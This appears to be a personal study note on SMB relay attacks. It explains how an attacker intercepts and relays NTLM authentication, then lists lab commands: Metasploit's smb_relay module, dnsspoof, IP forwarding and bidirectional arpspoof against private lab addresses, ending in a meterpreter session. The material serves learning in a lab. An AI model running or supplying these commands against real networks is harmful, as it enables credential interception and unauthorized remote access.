### SMB relay Attack
- An SMB relay attack is a type of network attack  where an attacker intercepts SMB (Server Message Block) traffic,maniputes it,and relays it to a legitimate server to gain unauthorized access to resources or perform malicious actions
- This type of attack is common in Windows networks,where SMB is used for file sharing,printer and other network sevices.
#### How SMB Relay Attacks Work
- Interception: The attacker sets up a man-in-the-middle position between the client and the server.This can be done using various techniques,such as ARP spoofing,DNS poisoning,or setting up a rogue smb server.
- Capturing authentication: When a client connects to a legitimate server via SMB,it sends authentication data.The attacker captures this data,which might include NTLM (NT LAN Manager) hashes.
- Relaying to a legitimate Server: Instead of decrypting the captured NTLM hash the attacker relays it to another server that trusts the source.This allows the attacker to impersonate the user whose hash was captured.
- Gain Access: If the relay is successful,the attacker can gian access to the resources on the sever.which might include sensitive files,databases or administrative privileges.This access could lead to further lateral movement within the network,compromising additional systems.

#### lab
- msfconsole
- use exploit/windows/smb/smb_relay
- set SRVHOST 172.16.5.10 [attacker_ip]
- set LHOST 172.16.5.10  [attacker_ip]
- set SMBHOST 172.16.5.10 [this ip is given ]
- run
- move to new tab in attacker kali machine
- echo "172.16.5.101 *.sportfee.com *.dns" >dns
- dnsspoof -i eth1 -f dns
- move to new tab
- echo 1 >/proc/sys/net/ipv4/ip_forward [hit enter]
- arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
- move new tab
- arpspoof -i eth1 -t 172.16.5.1 172.16.5.5 [hit enter]
- finally we find a meterpreter sessions

